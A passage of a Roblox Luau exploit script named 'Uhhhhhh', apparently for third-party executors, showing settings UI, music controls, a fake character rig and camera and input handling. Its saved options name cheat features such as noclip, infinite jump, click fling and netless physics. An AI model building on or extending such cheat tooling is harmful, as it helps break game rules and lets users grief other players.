		CracktroFrame.Interactable = true
	end)
end)
UI.CreateSwitch(MainPage, "Skip Intro", SaveData.SkipIntro).Changed:Connect(function(value)
	SaveData.SkipIntro = value
end)
UI.CreateDropdown(MainPage, "UI Theme", {
	"RGB/Default",
	"ALONE",
	"Crimson",
}, SaveData.UITheme).Changed:Connect(function(val)
	SaveData.UITheme = val
	SetUITheme(SaveData.UITheme)
end)
UI.CreateSeparator(MainPage)

local MusicName = UI.CreateText(MainPage, "", 15, Enum.TextXAlignment.Center)
UI.CreateButton(MainPage, "Random UI Music", 20).Activated:Connect(function()
	MusicPlayer.PlayMusic()
end)
local _musicnames = {"-- Choose --"}
for i=1, #MusicPlayer.Database do
	local hi = MusicPlayer.Database[i]
	table.insert(_musicnames, hi[2])
end
local MusicSelect = UI.CreateDropdown(MainPage, "UI Music", _musicnames, 1)
MusicSelect.Changed:Connect(function(val)
	if val > 1 then
		MusicSelect.Value = 1
		MusicPlayer.PlayMusic(val - 1)
	end
end)
UI.CreateSwitch(MainPage, math.random(8) == 1 and "Mute @Noober 67s" or "Mute UI Music", SaveData.MuteUIMusic).Changed:Connect(function(value)
	SaveData.MuteUIMusic = value
end)
UI.CreateSwitch(MainPage, "Mute Reanim Music", SaveData.MuteReanimMusic).Changed:Connect(function(value)
	SaveData.MuteReanimMusic = value
end)
UI.CreateSwitch(MainPage, "Mute Sounds", SaveData.MuteUISound).Changed:Connect(function(value)
	SaveData.MuteUISound = value
	if value then
		UISound.Click.Volume = 0
	else
		UISound.Click.Volume = 1
	end
end)
UI.CreateSeparator(MainPage)

UISound.MovesetMusic = Util.Instance("Sound", UIMainFrame)
UISound.MovesetMusic.Looped = true
UISound.MovesetMusic.PlaybackRegionsEnabled = false
UISound.MovesetMusic.Volume = 1
UISound.MovesetMusic.Name = "(unknown)"
UISound.MovesetMusic:SetAttribute("Volume", 1)
local function SetOverrideMovesetMusic(soundid, soundname, volume, region)
	if soundid then
		UISound.MovesetMusic.SoundId = soundid
		UISound.MovesetMusic.Name = soundname or "(unknown)"
		if volume ~= nil then
			UISound.MovesetMusic:SetAttribute("Volume", volume)
		else
			UISound.MovesetMusic:SetAttribute("Volume", 1)
		end
		if region ~= nil then
			UISound.MovesetMusic.PlaybackRegionsEnabled = true
			UISound.MovesetMusic.LoopRegion = region
		else
			UISound.MovesetMusic.PlaybackRegionsEnabled = false
		end
		UISound.MovesetMusic.PlaybackSpeed = 1
		UISound.MovesetMusic.TimePosition = 0
		UISound.MovesetMusic:Play()
	else
		UISound.MovesetMusic:Stop()
	end
end
local function GetOverrideMovesetMusicTime()
	return UISound.MovesetMusic.TimePosition
end
local function SetOverrideMovesetMusicTime(t)
	UISound.MovesetMusic.TimePosition = t
end
local function SetOverrideMovesetMusicSpeed(speed)
	UISound.MovesetMusic.PlaybackSpeed = speed
end
UISound.DanceMusic = Util.Instance("Sound", UIMainFrame)
UISound.DanceMusic.Looped = true
UISound.DanceMusic.PlaybackRegionsEnabled = false
UISound.DanceMusic.Volume = 1
UISound.DanceMusic.Name = "(unknown)"
UISound.DanceMusic:SetAttribute("Volume", 1)
local function SetOverrideDanceMusic(soundid, soundname, volume, region)
	if soundid then
		UISound.DanceMusic.SoundId = soundid
		UISound.DanceMusic.Name = soundname or "(unknown)"
		if volume ~= nil then
			UISound.DanceMusic:SetAttribute("Volume", volume)
		else
			UISound.DanceMusic:SetAttribute("Volume", 1)
		end
		if region ~= nil then
			UISound.DanceMusic.PlaybackRegionsEnabled = true
			UISound.DanceMusic.LoopRegion = region
		else
			UISound.DanceMusic.PlaybackRegionsEnabled = false
		end
		UISound.DanceMusic.PlaybackSpeed = 1
		UISound.DanceMusic.TimePosition = 0
		UISound.DanceMusic:Play()
	else
		UISound.DanceMusic:Stop()
	end
end
local function GetOverrideDanceMusicTime()
	return UISound.DanceMusic.TimePosition
end
local function SetOverrideDanceMusicTime(t)
	UISound.DanceMusic.TimePosition = t
end
local function SetOverrideDanceMusicSpeed(speed)
	UISound.DanceMusic.PlaybackSpeed = speed
end

local _MainMusicIsMuted = SaveData.MuteUIMusic
AddToRenderStep(function()
	local musicname = UISound.Music.Name
	local mustmute = SaveData.MuteUIMusic
	if SaveData.MuteReanimMusic then
		UISound.MovesetMusic.Volume = 0
		UISound.DanceMusic.Volume = 0
	else
		if UISound.DanceMusic.IsPlaying then
			mustmute = true
			UISound.DanceMusic.Volume = UISound.DanceMusic:GetAttribute("Volume")
			UISound.MovesetMusic.Volume = 0
			musicname = UISound.DanceMusic.Name
		elseif UISound.MovesetMusic.IsPlaying then
			mustmute = true
			UISound.MovesetMusic.Volume = UISound.MovesetMusic:GetAttribute("Volume")
			musicname = UISound.MovesetMusic.Name
		end
	end
	if _MainMusicIsMuted ~= mustmute then
		_MainMusicIsMuted = mustmute
		if mustmute then
			UISound.Music.Volume = 0
		else
			UISound.Music.Volume = 1
		end
	end
	MusicName.Text = `Current Music Playing:\n{musicname:gsub("&", "&amp;"):gsub("<", "&lt;"):gsub(">", "&gt;")}`
end)
task.wait()

FallenPartsDestroyHeight = workspace.FallenPartsDestroyHeight
if FallenPartsDestroyHeight ~= FallenPartsDestroyHeight then
	FallenPartsDestroyHeight = -500
end
local RejectCharacterDeletionsDisabled = false
pcall(function()
	local rcd, _ = gethiddenproperty(workspace, "RejectCharacterDeletions")
	if rcd.Name == "Disabled" then
		RejectCharacterDeletionsDisabled = true
	end
end)

local function CreateHumanoidCharacter()
	local char = Util.Instance("Model")
	char.Name = "(C) Uhhhhhh V" .. UhhhhhhVersion

	local god = Util.Instance("ForceField", char)
	god.Name = "heyy!! :33"
	god.Visible = false

	local hum = Util.Instance("Humanoid", char)
	hum.Name = "Humanoid"
	hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
	hum.RequiresNeck = false
	hum.BreakJointsOnDeath = false
	hum.UseJumpPower = true
	hum.WalkSpeed = 16
	hum.JumpPower = 50
	hum.Health = 100
	hum.MaxHealth = 100
	hum.MaxSlopeAngle = 89
	hum.HipHeight = 0
	hum.AutoRotate = true
	hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)

	local function makePart(name, size, pos)
		local part = Util.Instance("Part", char)
		part.Name = name
		part.Size = size
		part.Position = pos
		part.Anchored = false
		part.CanCollide = false
		part.Transparency = 1
		part.Reflectance = 0
		part.Color = Color3.new(1, 0, 0)
		part.CastShadow = false
		part.TopSurface = Enum.SurfaceType.Smooth
		part.BottomSurface = Enum.SurfaceType.Smooth
		part.LeftSurface = Enum.SurfaceType.Smooth
		part.RightSurface = Enum.SurfaceType.Smooth
		part.FrontSurface = Enum.SurfaceType.Smooth
		part.BackSurface = Enum.SurfaceType.Smooth
		return part
	end

	local root = makePart("HumanoidRootPart", Vector3.new(2, 2, 1), Vector3.new(0, 0, 0))
	local torso = makePart("Torso", Vector3.new(2, 2, 1), Vector3.new(0, 0, 0))
	local head = makePart("Head", Vector3.new(2, 1, 1), Vector3.new(0, 1.5, 0))
	local leftArm = makePart("Left Arm", Vector3.new(1, 2, 1), Vector3.new(-1.5, 0, 0))
	local rightArm = makePart("Right Arm", Vector3.new(1, 2, 1), Vector3.new(1.5, 0, 0))
	local leftLeg = makePart("Left Leg", Vector3.new(1, 2, 1), Vector3.new(-0.5, -2, 0))
	local rightLeg = makePart("Right Leg", Vector3.new(1, 2, 1), Vector3.new(0.5, -2, 0))

	local function makeMotor(name, p0, p1, c0, c1)
		local motor = Instance.new("Motor6D", p0)
		motor.Name = name
		motor.Part0 = p0
		motor.Part1 = p1
		motor.C0 = c0
		motor.C1 = c1
		motor.MaxVelocity = 0
		Util.LinkDestroyI2C(motor, RunService.PreRender:Connect(function()
			local scale = char:GetScale()
			motor:SetAttribute("Transform", Util.ScaleCFrame(motor.Transform, 1 / scale))
			motor.Transform = Util.ScaleCFrame(motor:GetAttribute("Transform") or CFrame.identity, scale)
		end))
	end

	makeMotor(
		"RootJoint", root, torso,
		CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0),
		CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
	)
	makeMotor(
		"Neck", torso, head,
		CFrame.new(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0),
		CFrame.new(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, 0)
	)
	makeMotor(
		"Left Shoulder", torso, leftArm,
		CFrame.new(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
		CFrame.new(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
	)
	makeMotor(
		"Right Shoulder", torso, rightArm,
		CFrame.new(1, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0),
		CFrame.new(-0.5, 0.5, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
	)
	makeMotor(
		"Left Hip", torso, leftLeg,
		CFrame.new(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
		CFrame.new(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
	)
	makeMotor(
		"Right Hip", torso, rightLeg,
		CFrame.new(1, -1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0),
		CFrame.new(0.5, 1, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
	)

	local headshape = Util.Instance("SpecialMesh", head)
	headshape.Name = "Mesh"
	headshape.MeshType = Enum.MeshType.Head
	headshape.Scale = Vector3.new(1.25, 1.25, 1.25)

	local face = Util.Instance("Decal", head)
	face.Name = "face"
	face.Texture = "rbxassetid://123572006339559"
	face.Color3 = Color3.new(0, 0, 0)

	local tshirt = Util.Instance("Decal", torso)
	tshirt.Name = "triforce"
	tshirt.Texture = "rbxassetid://101055520647223"
	tshirt.Color3 = Color3.new(1, 1, 1)
	
	Util.LinkDestroyI2C(char, RunService.PreRender:Connect(function()
		face.Transparency = Util.GetTransparency(head)
		tshirt.Transparency = Util.GetTransparency(torso)
	end))

	char.PrimaryPart = root

	return char
end

local GameSettings = UserSettings():GetService("UserGameSettings")

SaveData.NoInfiniteJump = not not SaveData.NoInfiniteJump
SaveData.NoclipEnabled = not not SaveData.NoclipEnabled
SaveData.CtrlClickEnabled = not not SaveData.CtrlClickEnabled
SaveData.ClickFlingEnabled = not not SaveData.ClickFlingEnabled
SaveData.NoSmoothCam = not not SaveData.NoSmoothCam
SaveData.FirstPersonBody = not not SaveData.FirstPersonBody
SaveData.NoSeatSitEnabled = not SaveData.NoSeatSitEnabled
SaveData.ToolGrabEnabled = not not SaveData.ToolGrabEnabled
SaveData.ScaleGravityEnabled = not not SaveData.ScaleGravityEnabled
SaveData.CharacterScale = SaveData.CharacterScale or 1
SaveData.P2PCollision = not not SaveData.P2PCollision
SaveData.ShiftlockDisabled = not not SaveData.ShiftlockDisabled
SaveData.NoLoadAnimationHook = not not SaveData.NoLoadAnimationHook
SaveData.NoPhysicsRepRootPart = not not SaveData.NoPhysicsRepRootPart
SaveData.NetlessVelocity = SaveData.NetlessVelocity or 25.01
SaveData.UsePatchmaLikeNetless = not not SaveData.UsePatchmaLikeNetless
SaveData.UseAngularVelocity = not not SaveData.UseAngularVelocity
SaveData.PatchmaVoidFloat = not not SaveData.PatchmaVoidFloat
SaveData.PlaceholderTransparency = SaveData.PlaceholderTransparency or 0.5

-- empyrean-like thing
local _G_Uhhhhhh = {}
-- jjsloit didnt have _G, just making sure if 100% unc execs dont have this even
pcall(function() _G.Uhhhhhh = _G_Uhhhhhh end)
_G_Uhhhhhh.BindableEvent = Util.Instance("BindableEvent") -- not used 3:

local Reanimate = {
	Current = nil,
	Character = nil,
	CharacterLTMs = {},
	Starting = false,
	Stopping = false,
	UseLoadAnimationHook = not SaveData.NoLoadAnimationHook,
	UsePhysicsRepRootPart = not SaveData.NoPhysicsRepRootPart,
	PhysicsRepRootPartFling = 1 / 10,
	NetlessVelocity = SaveData.NetlessVelocity,
	UsePatchmaLikeNetless = SaveData.UsePatchmaLikeNetless,
	UseAngularVelocity = SaveData.UseAngularVelocity,
	InfiniteJump = not SaveData.NoInfiniteJump,
	Noclip = SaveData.NoclipEnabled,
	CtrlClick = SaveData.CtrlClickEnabled,
	ClickFling = SaveData.ClickFlingEnabled,
	SmoothCam = not SaveData.NoSmoothCam,
	FirstPersonBody = SaveData.FirstPersonBody,
	SeatSit = not SaveData.NoSeatSitEnabled,
	ToolGrab = SaveData.ToolGrabEnabled,
	ScaleGravity = SaveData.ScaleGravityEnabled,
	PatchmaVoidFloat = SaveData.PatchmaVoidFloat,
	AntiExplosions = true,
	CharacterScale = SaveData.CharacterScale,
	PlaceholderTransparency = SaveData.PlaceholderTransparency,
	P2PCollision = false,
	ShiftlockEnabled = not SaveData.ShiftlockDisabled,
	Shiftlocked = false,
	ShouldRotationType = function(self)
		if self.Camera:IsMouseLocked() and not self.Camera.Scriptable and self.Character then
			local hum = self.Character:FindFirstChildOfClass("Humanoid")
			if hum and hum.AutoRotate and hum.RootPart and not hum.RootPart:IsGrounded() then
				local state = hum:GetState().Name
				if table.find({"Running", "Jumping", "Freefall", "Landed", "Climbing"}, state) then
					return true
				end
			end
		end
		return false
	end,
	Camera = {
		CFrame = CFrame.identity,
		Focus = CFrame.identity,
		Scriptable = false,
		VRMode = false,
		FPSLocked = false,
		Zoom = 16,
		FieldOfView = 70,
		Input = Vector3.zero,
		_Zoom = 16,
		OnReset = function(self)
			self.Zoom = (self.Focus.Position - self.CFrame.Position).Magnitude
			self._Zoom = self.Zoom
			self.Scriptable = false
			self.FPSLocked = false
			self.FieldOfView = 70
			self.Inputs:Reset()
		end,
		OnPanInput = function(self, vec, accum)
			if accum then
				self.Input += Vector3.new(vec.X, vec.Y, 0)
			else
				self.Input = Vector3.new(vec.X, vec.Y, self.Input.Z)
			end
		end,
		OnZoomInput = function(self, zoom)
			self.Input = Vector3.new(self.Input.X, self.Input.Y, zoom)
		end,
		Inputs = {
			KB = {
				Left = false,
				Right = false,
			},
			MS = {
				RMB = false,
			},
			TC = {
				DJ = nil,
				Touch = {},
				LP = nil,
			},
			GP = {
				DJ = Vector2.zero,
			},
			Reset = function(self)
				self.KB.Left = false
				self.KB.Right = false
				self.MS.RMB = false
				self.TC.DJ = nil
				table.clear(self.TC.Touch)
				self.TC.LP = nil
				self.GP.DJ = Vector2.zero
			end,
		},
	},
	LocalTransparencyModifier = 0,
	Control = {
		Move = Vector3.zero,
		Jump = false,
		Inputs = {
			KB = {
				Up = false,
				Down = false,
				Left = false,
				Right = false,
				Space = false,
			},
			TC = {
				DJ = nil,
				LP = nil,
				JB = nil,
			},
			GP = {
				DJ = Vector2.zero,
				JB = false,
			},
			Reset = function(self)
				self.KB.Up = false
				self.KB.Down = false
				self.KB.Left = false
				self.KB.Right = false
				self.KB.Space = false
				self.TC.DJ = nil
				self.TC.LP = nil
				self.TC.JB = nil
				self.GP.DJ = Vector2.zero
				self.GP.JB = false
			end,
		}
	}
}
Reanimate.Camera.IsFirstPerson = function(self)
	return self.Zoom < 0.75
end
Reanimate.Camera.IsMouseLocked = function(self)
	return self:IsFirstPerson() or Reanimate.Shiftlocked
end
Reanimate.Camera.IsMousePanning = function(self)
	return self:IsMouseLocked() or self.Inputs.MS.RMB
end
Reanimate.Camera.GetMovementCFrame = function(self)
	local ccf = Reanimate.Camera.CFrame
	if Reanimate.Camera.VRMode then
		local _,y,_ = VRService:GetUserCFrame(Enum.UserCFrame.Head):ToEulerAngles(Enum.RotationOrder.YXZ)
		ccf *= CFrame.Angles(0, y, 0)
	end
	return ccf
end
do
	local thumbstickAreaTopLeft = nil
	local thumbstickAreaBottomRight = nil
	local jumpButtonTopLeft = nil
	local jumpButtonBottomRight = nil
	local function IsInArea(pos, tl, br)
		return pos.X >= tl.X and pos.Y >= tl.Y and pos.X <= br.X and pos.Y <= br.Y
	end
	local function WillSinkToWorld(pos)
		local playerGui = Player:FindFirstChildOfClass("PlayerGui")
		local touchGui
		if playerGui then
			touchGui = playerGui:FindFirstChild("TouchGui")
		end
		local corestuff = CoreGui:GetGuiObjectsAtPosition(pos.X, pos.Y)
		for _,v in corestuff do
			if Util.WillGuiSinkInput(v) then
				return false
			end
		end
		local plrstuff = playerGui:GetGuiObjectsAtPosition(pos.X, pos.Y)
		for _,v in plrstuff do
			if v:IsDescendantOf(touchGui) then
				return true
			end
			if Util.WillGuiSinkInput(v) then
				return false
			end
		end
		return true
	end
	local function IsInThumbstickArea(pos)
		local playerGui = Player:FindFirstChildOfClass("PlayerGui")
		if playerGui then
			local touchGui = playerGui:FindFirstChild("TouchGui")
			if touchGui and touchGui.Enabled then
				local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
				local thumbstickFrame = touchFrame and (touchFrame:FindFirstChild("DynamicThumbstickFrame") or touchFrame:FindFirstChild("ThumbstickFrame"))
				if thumbstickFrame then
					thumbstickAreaTopLeft = thumbstickFrame.AbsolutePosition
					thumbstickAreaBottomRight = thumbstickAreaTopLeft + thumbstickFrame.AbsoluteSize
				end
			end
		end
		if thumbstickAreaTopLeft and thumbstickAreaBottomRight then
			return IsInArea(pos, thumbstickAreaTopLeft, thumbstickAreaBottomRight)
		end
		return false
	end
	local function IsInJumpButtonArea(pos)
		local playerGui = Player:FindFirstChildOfClass("PlayerGui")
		if playerGui then
			local touchGui = playerGui:FindFirstChild("TouchGui")
			if touchGui and touchGui.Enabled then
				local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
				local jumpButton = touchFrame and touchFrame:FindFirstChild("JumpButton")
				if jumpButton then
					jumpButtonTopLeft = jumpButton.AbsolutePosition
					jumpButtonBottomRight = jumpButtonTopLeft + jumpButton.AbsoluteSize
				end
			end
		end
		if jumpButtonTopLeft and jumpButtonBottomRight then
			return IsInArea(pos, jumpButtonTopLeft, jumpButtonBottomRight)
		end
		return false
	end
	do -- Control
		local self = Reanimate.Control
		UserInputService.InputBegan:Connect(function(input, gpe)
			if GuiService.MenuIsOpen then return end
			if UserInputService:GetFocusedTextBox() then return end
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == Enum.KeyCode.W then
					self.Inputs.KB.Up = true
				end
				if input.KeyCode == Enum.KeyCode.S then
					self.Inputs.KB.Down = true
				end
				if input.KeyCode == Enum.KeyCode.Up then
					self.Inputs.KB.Up = true
				end
				if input.KeyCode == Enum.KeyCode.Down then
					self.Inputs.KB.Down = true
				end
				if input.KeyCode == Enum.KeyCode.A then
					self.Inputs.KB.Left = true
				end
				if input.KeyCode == Enum.KeyCode.D then
					self.Inputs.KB.Right = true
				end
				if input.KeyCode == Enum.KeyCode.Space then
					self.Inputs.KB.Space = true
				end
			end
			if input.KeyCode == Enum.KeyCode.ButtonA then
				self.Inputs.GP.JB = true
			end
			if input.UserInputType == Enum.UserInputType.Touch and WillSinkToWorld(input.Position) then
				if self.Inputs.TC.DJ == nil and IsInThumbstickArea(input.Position) then
					self.Inputs.TC.DJ = input
					self.Inputs.TC.LP = input.Position
					return
				end
				if self.Inputs.TC.JB == nil and IsInJumpButtonArea(input.Position) then
					self.Inputs.TC.JB = input
					return
				end
			end
		end)
		UserInputService.InputChanged:Connect(function(input, gpe)
			if GuiService.MenuIsOpen then return end
			if UserInputService:GetFocusedTextBox() then return end
			if input.KeyCode == Enum.KeyCode.Thumbstick1 then
				self.Inputs.GP.DJ = Vector2.new(input.Position.X, -input.Position.Y)
			end
		end)
		UserInputService.InputEnded:Connect(function(input)
			if GuiService.MenuIsOpen then return end
			if UserInputService:GetFocusedTextBox() then return end
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == Enum.KeyCode.W then
					self.Inputs.KB.Up = false
				end
				if input.KeyCode == Enum.KeyCode.S then
					self.Inputs.KB.Down = false
				end
				if input.KeyCode == Enum.KeyCode.Up then
					self.Inputs.KB.Up = false
				end
				if input.KeyCode == Enum.KeyCode.Down then
					self.Inputs.KB.Down = false
				end
				if input.KeyCode == Enum.KeyCode.A then
					self.Inputs.KB.Left = false
				end
				if input.KeyCode == Enum.KeyCode.D then
					self.Inputs.KB.Right = false
				end
				if input.KeyCode == Enum.KeyCode.Space then
					self.Inputs.KB.Space = false
				end
			end
			if input.KeyCode == Enum.KeyCode.ButtonA then
				self.Inputs.GP.JB = false
			end
			if input.UserInputType == Enum.UserInputType.Touch then
				if self.Inputs.TC.DJ == input then
					self.Inputs.TC.DJ = nil
					self.Inputs.TC.LP = nil
				elseif self.Inputs.TC.JB == input then
					self.Inputs.TC.JB = nil
				end
			end
			if input.KeyCode == Enum.KeyCode.Thumbstick1 then
				self.Inputs.GP.DJ = Vector2.zero
			end
		end)
		local function resetInputDevices()
			self.Inputs:Reset()
		end
		UserInputService.WindowFocused:Connect(resetInputDevices)
		UserInputService.WindowFocusReleased:Connect(resetInputDevices)
		UserInputService.TextBoxFocusReleased:Connect(resetInputDevices)
		GuiService.MenuOpened:Connect(resetInputDevices)
		RunService:BindToRenderStep("Uhhhhhh_Control", Enum.RenderPriority.Input.Value + 1, function(dt)
			if UserInputService:GetFocusedTextBox() then
				resetInputDevices()
			end
			local screensize = Util.GetScreenSize()
			self.Move = Vector3.zero
			if self.Inputs.KB.Up then
				self.Move += Vector3.new(0, 0, -1)
			end
			if self.Inputs.KB.Down then
				self.Move += Vector3.new(0, 0, 1)
			end
			if self.Inputs.KB.Left then
				self.Move += Vector3.new(-1, 0, 0)
			end
			if self.Inputs.KB.Right then
				self.Move += Vector3.new(1, 0, 0)
			end
			if self.Inputs.TC.DJ and self.Inputs.TC.LP then
				local stickrad = 40
				if math.min(screensize.X, screensize.Y) < 500 then
					stickrad = 20
				end
				local dir = (self.Inputs.TC.DJ.Position - self.Inputs.TC.LP) / stickrad
				if dir.Magnitude > 0.05 then
					dir = dir.Unit * math.min(1, (dir.Magnitude - 0.05) / (1 - 0.05))
					self.Move += Vector3.new(dir.X, 0, dir.Y)
				end
			end
			if self.Inputs.GP.DJ.Magnitude > 0.2 then
				self.Move += Vector3.new(self.Inputs.GP.DJ.X, 0, self.Inputs.GP.DJ.Y)
			end
			if self.Move.Magnitude > 1 then self.Move = self.Move.Unit end
			self.Jump = false
			if self.Inputs.KB.Space then
				self.Jump = true
			end
			if self.Inputs.TC.JB then
				self.Jump = true
			end
			if self.Inputs.GP.JB then
				self.Jump = true
			end
		end)
	end
	do -- Camera
		local self = Reanimate.Camera
		local function AdjustTouchPitchSensitivity(delta)
			local pitch = Camera.CFrame:ToEulerAnglesYXZ()
			if delta.Y * pitch >= 0 then
				return delta
			end
			local curveY = 1 - (2 * math.abs(pitch) / math.pi) ^ 0.75
			local sensitivity = curveY * 0.75 + 0.25
			return Vector2.new(1, sensitivity) * delta
		end
		local thumbstickCurve do
			local K_CURVATURE = 2 -- amount of upwards curvature (0 is flat)
			local K_DEADZONE = 0.1 -- deadzone
			function thumbstickCurve(x)
				local fDeadzone = (math.abs(x) - K_DEADZONE)/(1 - K_DEADZONE)
				local fCurve = (math.exp(K_CURVATURE*fDeadzone) - 1)/(math.exp(K_CURVATURE) - 1)
				return math.sign(x)*math.clamp(fCurve, 0, 1)
			end
		end
		UserInputService.InputBegan:Connect(function(input, gpe)
			if GuiService.MenuIsOpen then return end
			if UserInputService:GetFocusedTextBox() then return end
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
					Reanimate.Shiftlocked = Reanimate.ShiftlockEnabled and not Reanimate.Shiftlocked
				end
				if input.KeyCode == Enum.KeyCode.Left then
					self.Inputs.KB.Left = true
				end
				if input.KeyCode == Enum.KeyCode.Right then
					self.Inputs.KB.Right = true
				end
			end
			if input.KeyCode == Enum.KeyCode.ButtonL3 then
				if self.VRMode then
					if self.Zoom < 7 then
						self.Zoom = 7
					else
						self.Zoom = 0.5
					end
				else
					if self.Zoom <= 0.5 then
						self.Zoom = 20
					elseif self.Zoom <= 10 then
						self.Zoom = 0.5
					elseif self.Zoom <= 20 then
						self.Zoom = 10
					else
						self.Zoom = 20
					end
				end
			end
			if input.KeyCode == Enum.KeyCode.ButtonR3 then
				if self.VRMode then
					-- laziest implementation
					VRService:RecenterUserHeadCFrame()
				end
			end
			if input.UserInputType == Enum.UserInputType.MouseButton2 then
				if gpe then return end
				self.Inputs.MS.RMB = true
			end
			if input.UserInputType == Enum.UserInputType.Touch then
				if gpe then return end
				if self.Inputs.TC.DJ == nil and IsInThumbstickArea(input.Position) then
					self.Inputs.TC.DJ = input
					return
				end
				self.Inputs.TC.Touch[input] = true
			end
		end)
		UserInputService.InputChanged:Connect(function(input, gpe)
			if GuiService.MenuIsOpen then return end
			if input.UserInputType == Enum.UserInputType.MouseMovement then
				if self:IsMousePanning() then
					self:OnPanInput(Vector2.new(input.Delta.X, input.Delta.Y) * Vector2.new(1, 0.77) * math.rad(0.5), false)
				end
			end
			if input.UserInputType == Enum.UserInputType.MouseWheel then
				if gpe then return end
				self:OnZoomInput(-input.Position.Z)
			end
			if input.UserInputType == Enum.UserInputType.Touch then
				if self.Inputs.TC.DJ == input then
					return
				end
				local touches = {}
				for touch,exist in self.Inputs.TC.Touch do
					if exist then table.insert(touches, touch) end
				end
				if #touches == 1 then
					if touches[1] == input then
						self:OnPanInput(Vector2.new(input.Delta.X, input.Delta.Y) * Vector2.new(1, 0.66) * math.rad(1), true)
					end
				end
				if #touches == 2 then
					local pinch = (touches[1].Position - touches[2].Position).Magnitude
					if self.Inputs.TC.LP then
						local zoom = (self.Inputs.TC.LP - pinch) * 0.04
						self:OnZoomInput(zoom)
					end
					self.Inputs.TC.LP = pinch
				else
					self.Inputs.TC.LP = nil
				end
			end
			if input.KeyCode == Enum.KeyCode.Thumbstick2 then
				self.Inputs.GP.DJ = Vector2.new(thumbstickCurve(input.Position.X), -thumbstickCurve(input.Position.Y))
			end
		end)
		UserInputService.InputEnded:Connect(function(input)
			if GuiService.MenuIsOpen then return end
			if UserInputService:GetFocusedTextBox() then return end
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == Enum.KeyCode.Left then
					self.Inputs.KB.Left = false
				end
				if input.KeyCode == Enum.KeyCode.Right then
					self.Inputs.KB.Right = false
				end
			end
			if input.UserInputType == Enum.UserInputType.MouseButton2 then
				self.Inputs.MS.RMB = false
			end
			if input.UserInputType == Enum.UserInputType.Touch then
				if self.Inputs.TC.DJ == input then
					self.Inputs.TC.DJ = nil
					return
				end
				self.Inputs.TC.LP = nil
				self.Inputs.TC.Touch[input] = false
			end
			if input.KeyCode == Enum.KeyCode.Thumbstick2 then
				self.Inputs.GP.DJ = Vector2.zero
			end
		end)
		UserInputService.PointerAction:Connect(function(wheel, pan, pinch, gpe)
			if not gpe then
				self:OnPanInput(pan * Vector2.new(1, 0.77) * math.rad(7), false)
				self:OnZoomInput(-wheel - pinch)
			end
		end)
		local function resetInputDevices()
			self.Inputs:Reset()
		end
		UserInputService.WindowFocused:Connect(resetInputDevices)
		UserInputService.WindowFocusReleased:Connect(resetInputDevices)
		UserInputService.TextBoxFocusReleased:Connect(resetInputDevices)
		GuiService.MenuOpened:Connect(resetInputDevices)
		local states = {
			[false] = "rbxasset://textures/ui/mouseLock_off@2x.png",
			[true] = "rbxasset://textures/ui/mouseLock_on@2x.png"
		}
		local MobileShiftlock = Instance.new("ImageButton")
		MobileShiftlock.Parent = SCREENGUI
		MobileShiftlock.BackgroundTransparency = 1
		MobileShiftlock.Position = UDim2.new(1, -190, 1, -60)
		MobileShiftlock.Size = UDim2.new(0, 40, 0, 40)
		MobileShiftlock.Image = states[false]
		local state = false
		AddToRenderStep(function()
			local playerGui = Player:FindFirstChildOfClass("PlayerGui")
			local touchGui = playerGui and playerGui:FindFirstChild("TouchGui")
			if not touchGui or not touchGui.Enabled then
				MobileShiftlock.Visible = false
				return
			end
			local touchFrame = touchGui and touchGui:FindFirstChild("TouchControlFrame")
			local jumpButton = touchFrame and touchFrame:FindFirstChild("JumpButton")
			if not jumpButton then
				MobileShiftlock.Visible = false
				return
			end
			if state ~= Reanimate.Shiftlocked then
				state = Reanimate.Shiftlocked
				MobileShiftlock.Image = states[state]
			end
			MobileShiftlock.Visible = not not Reanimate.Character
			local pos = jumpButton.AbsolutePosition - SCREENGUI.AbsolutePosition
			local size = jumpButton.AbsoluteSize
			local ratio = 4 / 7
			pos += Vector2.new(-size.X * (ratio + 0.2), size.Y * (1 - ratio))
			size *= ratio
			MobileShiftlock.Position = UDim2.fromOffset(pos.X, pos.Y)
			MobileShiftlock.Size = UDim2.fromOffset(size.X, size.Y)
		end)
		MobileShiftlock.Activated:Connect(function()
			Reanimate.Shiftlocked = Reanimate.ShiftlockEnabled and not Reanimate.Shiftlocked
		end)
		RunService:BindToRenderStep("Uhhhhhh_Camera", Enum.RenderPriority.Camera.Value + 1, function(dt)
			self.VRMode = VRService.VREnabled
			if UserInputService:GetFocusedTextBox() then
				resetInputDevices()
			end
			if self.Inputs.KB.Left then
				self:OnPanInput(Vector2.new(math.rad(-120) * dt, 0), true)
			end
			if self.Inputs.KB.Right then
				self:OnPanInput(Vector2.new(math.rad(120) * dt, 0), true)
			end
			self:OnPanInput(self.Inputs.GP.DJ * Vector2.new(1, 0.77) * math.rad(4) * 60 * dt * GameSettings.GamepadCameraSensitivity, true)
			local input = self.Input * Vector3.new(1, GameSettings:GetCameraYInvertValue(), 1)
			self.Input = Vector3.zero
			local zoomDelta = input.Z
			if math.abs(zoomDelta) > 0 then
				if zoomDelta > 0 then
					self.Zoom += zoomDelta * (1 + self.Zoom * 0.5)
				else
					self.Zoom = (self.Zoom + zoomDelta) / (1 - zoomDelta * 0.5)
				end
			end
			self.Zoom = math.clamp(self.Zoom, 0.5, 100000)
